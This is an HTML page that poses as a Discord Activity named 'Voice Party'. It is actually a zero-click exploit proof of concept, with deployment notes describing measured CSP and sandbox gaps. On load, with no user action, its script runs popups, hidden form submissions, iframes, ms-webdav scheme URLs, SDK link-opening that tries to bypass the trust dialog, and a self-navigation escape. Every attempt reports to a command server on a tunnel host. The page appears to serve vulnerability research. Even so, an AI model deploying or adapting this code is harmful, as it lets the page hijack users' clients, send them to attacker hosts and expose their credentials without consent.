<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Voice Party</title>
<!--
  MESSAGE/VC = OWNED — Activity proof of concept, v2 zero-click battery.

  DEPLOY: copy this file AND bounce.html over the repo's voice-party/ dir and
  push. Dev-portal URL mappings needed:
    /    -> ammara0932496504.github.io/voice-party/   (the Activity page)
    /sdk -> cdn.jsdelivr.net/                         (SDK import)
    /c2  -> <tunnel host, e.g. xxx.trycloudflare.com> (tests dialog-skip;
                                                       NOT needed otherwise)
  Then launch via https://discord.com/activities/1562221016007184404
  or the Activities shelf in a voice channel.

  MEASURED FACTS (0.0.418 client + live proxy CSP), see STEPS.md:
  - Activity iframe sandbox has allow-popups ONLY when the app is first-party
    or its server-side config has displays_advertisements=true. The dev portal
    cannot set that, so window.open returns null (P1).
  - The proxy CSP allows frame-src/connect-src only to the app proxy, so
    P4/P5/P7 (child frames / beacons to an external host) are blocked inside
    Discord even though they work on a plain page.
  - CSP cannot restrict navigation of the frame itself (no navigate-to in
    Chromium), so P11 (self-nav) works with zero clicks and no mapping.
  - sdk openExternalLink shows a dialog UNLESS Discord's backend says the URL
    is trusted: GET /applications/<id>/trusted-links/check?url=… ⇒ {trusted}.
    The main-process gate is only a 14-scheme deny-list, so ms-webdav: passes
    once any renderer path reaches saferShellOpenExternal.

  Each primitive carries a nonce-TAG so hits.tsv shows which one landed.
  Tags: wopen, anchor, formget, formpost, iframe, redir, r302d, scheme,
  sdkDirect, sdkProx, sdkBounce, bounce2nd, selfnav.
-->
<style>
 html,body{margin:0;height:100%}
 body{background:#0b0c0e;color:#e6e6e6;font:15px/1.55 system-ui,-apple-system,"Segoe UI",sans-serif;
      display:grid;place-items:center;text-align:center}
 .card{width:min(480px,90vw);padding:28px 22px;border-radius:16px;background:#16181d;border:1px solid #23252b}
 h1{margin:0 0 6px;font-size:21px}
 p{margin:0 0 14px;color:#9aa0a6;font-size:14px}
 button{width:100%;background:#5865f2;border:0;color:#fff;padding:13px 18px;border-radius:10px;
        font:600 15px system-ui;cursor:pointer;margin-top:10px}
 button:active{transform:translateY(1px)}
 #log{margin-top:14px;text-align:left;font:12px/1.6 ui-monospace,monospace;color:#c9d1d9;
      background:#0b0c0e;border:1px solid #23252b;border-radius:10px;padding:10px;word-break:break-all;
      max-height:240px;overflow:auto}
 .ok{color:#3ba55d}.bad{color:#ff6b6b}.dim{color:#8b949e}
</style></head>
<body>
<div class="card">
  <h1>Voice Party</h1>
  <p>Join the session</p>
  <div id="log"><span class="dim">booting…</span></div>
  <button id="go">Start session</button>
</div>
<script type="module">
// SDK import: inside Discord the frame fetches through the URL-mapping proxy,
// so load via /sdk (mapped to cdn.jsdelivr.net). Plain browser falls back
// to the absolute CDN URL.
let DiscordSDK = null;
try { ({DiscordSDK} = await import('/sdk/npm/@discord/embedded-app-sdk@2.5.0/+esm')); }
catch { try { ({DiscordSDK} = await import('https://cdn.jsdelivr.net/npm/@discord/embedded-app-sdk@2.5.0/+esm')); } catch {} }

// ================= CONFIG =================
const APP_CLIENT_ID = '1562221016007184404';
const C2_BASE = 'https://trans-perfectly-pushing-headers.trycloudflare.com';
// P11 target: the Activity frame navigates itself here. Keep it https and
// reachable; no URL mapping is required (CSP does not cover frame self-nav).
const CARRIER_HOST = '127.0.0.1:8080';
const CARRIER = 'ms-webdav';
// ==========================================

const nonce = (Math.random()*1e9|0).toString(36) + '-' + Date.now().toString(36);
const can = (tag) => C2_BASE + '/canary?id=' + encodeURIComponent(nonce + '-' + tag);
const cred = (tag) => CARRIER + '://' + CARRIER_HOST + '/' + nonce + '-' + tag;
const logEl = document.getElementById('log');
function log(t, cls){
  const d=document.createElement('div'); if(cls)d.className=cls; d.textContent=t; logEl.appendChild(d);
  // Mirror the panel to the collector so results are readable even when a
  // primitive navigates the frame away (or when running inside Discord).
  try { fetch(C2_BASE + '/report', {method:'POST', mode:'no-cors', body: nonce + ' | ' + t}); } catch(e){}
}

const qs = new URLSearchParams(location.search);
const inDiscord = qs.has('frame_id') && qs.has('instance_id');
log('nonce: ' + nonce, 'dim');
log('context: ' + (inDiscord ? 'inside Discord Activity frame (SDK available)' : 'PLAIN PAGE — open this as an Activity inside Discord, not in a browser'), inDiscord ? 'ok' : 'bad');
let done = false;
const mark = (t) => { if (!done){ done = true; log('CHECK COLLECTOR hits.tsv FOR NONCE ' + nonce + '-' + t, 'ok'); } };

// Hidden target for form/iframe primitives (keeps the panel alive).
const holder = document.createElement('div');
holder.style.cssText = 'position:absolute;width:1px;height:1px;overflow:hidden;opacity:0.01';
holder.innerHTML = '<iframe name="eocehole" title="x"></iframe>';
document.body.appendChild(holder);

function pWindowOpen(){
  try {
    const w = window.open(can('wopen'), 'EOCECAN');
    log('P1 window.open(canary): ' + (w ? 'POPUP OBJECT (allowed)' : 'blocked (null)'), w ? 'ok' : 'bad');
    if (w) mark('wopen');
  } catch(e){ log('P1 window.open(canary) threw: ' + e, 'bad'); }
  try {
    const w2 = window.open(cred('wopen'), 'EOCECRED');
    log('P1 window.open(carrier): ' + (w2 ? 'POPUP OBJECT (allowed)' : 'blocked (null)'), w2 ? 'ok' : 'bad');
  } catch(e){ log('P1 window.open(carrier) threw: ' + e, 'bad'); }
}

function pAnchor(){
  try {
    const a = document.createElement('a');
    a.href = can('anchor'); a.target = '_blank'; a.rel = 'noopener';
    document.body.appendChild(a); a.click(); a.remove();
    log('P2 anchor.click(_blank): dispatched (check hits.tsv for -anchor)', 'dim');
  } catch(e){ log('P2 anchor threw: ' + e, 'bad'); }
}

function pForm(){
  try {
    const f = document.createElement('form');
    f.action = can('formget'); f.method = 'GET'; f.target = 'eocehole';
    document.body.appendChild(f); f.submit(); f.remove();
    log('P3 form GET submit: dispatched (check -formget)', 'dim');
  } catch(e){ log('P3 form GET threw: ' + e, 'bad'); }
  try {
    const f2 = document.createElement('form');
    f2.action = C2_BASE + '/canary'; f2.method = 'POST'; f2.target = 'eocehole';
    const inp = document.createElement('input');
    inp.name = 'id'; inp.value = nonce + '-formpost';
    f2.appendChild(inp); document.body.appendChild(f2); f2.submit(); f2.remove();
    log('P3 form POST submit: dispatched (check -formpost)', 'dim');
  } catch(e){ log('P3 form POST threw: ' + e, 'bad'); }
}

function pIframeNav(){
  // Direct subframe nav to the canary: in a normal page this loads; inside
  // Discord it may be CSP-blocked (unmapped host) — either result is data.
  try {
    const fr = document.createElement('iframe');
    fr.name = 'eocecan';
    fr.onload = () => log('P4 iframe(canary): onload (check -iframe)', 'ok');
    fr.onerror = () => log('P4 iframe(canary): onerror (blocked)', 'bad');
    fr.src = can('iframe');
    holder.appendChild(fr);
  } catch(e){ log('P4 iframe threw: ' + e, 'bad'); }
}

function pRedirect(){
  // Server-redirect chain: /r302 302s to the canary. A -r302d hit proves the
  // client followed a redirect with NO dialog.
  try {
    const fr = document.createElement('iframe');
    fr.onload = () => log('P5 iframe(/r302): onload (check -r302d)', 'ok');
    fr.src = C2_BASE + '/r302?id=' + encodeURIComponent(nonce);
    holder.appendChild(fr);
  } catch(e){ log('P5 redir threw: ' + e, 'bad'); }
}

function pScheme(){
  // Scheme URL in a subframe (no popup permission needed for navigation).
  try {
    const fr = document.createElement('iframe');
    fr.src = cred('scheme');
    holder.appendChild(fr);
    log('P6 iframe(ms-webdav): dispatched (OS prompt or block; no Discord dialog)', 'dim');
  } catch(e){ log('P6 scheme threw: ' + e, 'bad'); }
}

function pBounce(){
  // MAPPED bounce page in a subframe: allowed through the proxy, then IT
  // self-navigates to the canary. Tests 2nd-stage auto-nav inside the frame.
  try {
    const fr = document.createElement('iframe');
    fr.src = location.origin + '/bounce.html?n=' + encodeURIComponent(nonce + '-bounce');
    holder.appendChild(fr);
    log('P7 iframe(bounce.html): dispatched (check -bounce)', 'dim');
  } catch(e){ log('P7 bounce threw: ' + e, 'bad'); }
}

async function pSdk(){
  if (!inDiscord){ log('P8-10 SDK skipped: not in an Activity frame', 'bad'); return; }
  if (!DiscordSDK){ log('P8-10 SDK module did not load', 'bad'); return; }
  try {
    const sdk = new DiscordSDK(APP_CLIENT_ID);
    await sdk.ready();
    log('SDK ready: ok', 'ok');
    // P8: direct tunnel URL (expect the trust dialog on first run).
    try {
      const r = await sdk.commands.openExternalLink({url: can('sdkDirect')});
      log('P8 sdk(direct): opened=' + (r && r.opened), (r && r.opened) ? 'ok' : 'bad');
      if (r && r.opened) mark('sdkDirect');
    } catch(e){ log('P8 sdk(direct) error: ' + (e && e.message ? e.message : e), 'bad'); }
    // P9: proxied URL via /c2 mapping — EXPERIMENT: does a mapped host skip
    // the trust dialog? (Requires /c2 -> tunnel-host mapping in the portal.)
    try {
      const prox = location.origin + '/c2/canary?id=' + encodeURIComponent(nonce + '-sdkProx');
      const r2 = await sdk.commands.openExternalLink({url: prox});
      log('P9 sdk(proxied /c2): opened=' + (r2 && r2.opened), (r2 && r2.opened) ? 'ok' : 'bad');
      if (r2 && r2.opened) mark('sdkProx');
    } catch(e){ log('P9 sdk(proxied) error: ' + (e && e.message ? e.message : e), 'bad'); }
    // P10: same-app bounce page opened externally — if this skips the dialog,
    // the bounce runs in a REAL browser (no sandbox) and auto-fires the canary.
    try {
      const b = location.origin + '/bounce.html?n=' + encodeURIComponent(nonce + '-sdkBounce');
      const r3 = await sdk.commands.openExternalLink({url: b});
      log('P10 sdk(bounce): opened=' + (r3 && r3.opened), (r3 && r3.opened) ? 'ok' : 'bad');
      if (r3 && r3.opened) mark('sdkBounce');
    } catch(e){ log('P10 sdk(bounce) error: ' + (e && e.message ? e.message : e), 'bad'); }
  } catch(e){ log('SDK path error: ' + (e && e.message ? e.message : e), 'bad'); }
}

// Testing aid: ?skip=bounce,iframe,scheme,redir disables primitives so the
// panel survives long enough to be read (bounce/iframe can navigate away).
const SKIP = new Set((qs.get('skip') || '').split(',').filter(Boolean));

// P11: self-navigation. The proxy CSP (measured live on
// <appid>.discordsays.com) restricts frame-src/connect-src to the app proxy,
// but CSP does not govern navigation of the frame itself and Chromium has no
// navigate-to. So this replaces the Activity frame with an arbitrary page
// with zero clicks, zero dialogs and no URL mapping.
function pSelfNav(){
  setTimeout(() => {
    log('P11 self-nav -> canary (frame will be replaced)', 'dim');
    try { location.replace(can('selfnav')); } catch(e){ log('P11 threw: ' + e, 'bad'); }
  }, 2500);
}

async function fireAll(reason){
  log('--- fire (' + reason + ') ---', 'dim');
  if (!SKIP.has('wopen'))   pWindowOpen();
  if (!SKIP.has('anchor'))  pAnchor();
  if (!SKIP.has('form'))    pForm();
  if (!SKIP.has('iframe'))  pIframeNav();
  if (!SKIP.has('redir'))   pRedirect();
  if (!SKIP.has('scheme'))  pScheme();
  if (!SKIP.has('bounce'))  pBounce();
  if (!SKIP.has('sdk'))     await pSdk();
  if (!SKIP.has('selfnav') && qs.get('nav') !== '0') pSelfNav();
}

fireAll('on-load (zero clicks so far)');
setTimeout(()=>fireAll('t+1.5s (late-join beat)'), 1500);
document.getElementById('go').addEventListener('click', ()=>fireAll('button click (user activation)'));
</script>
</body></html>
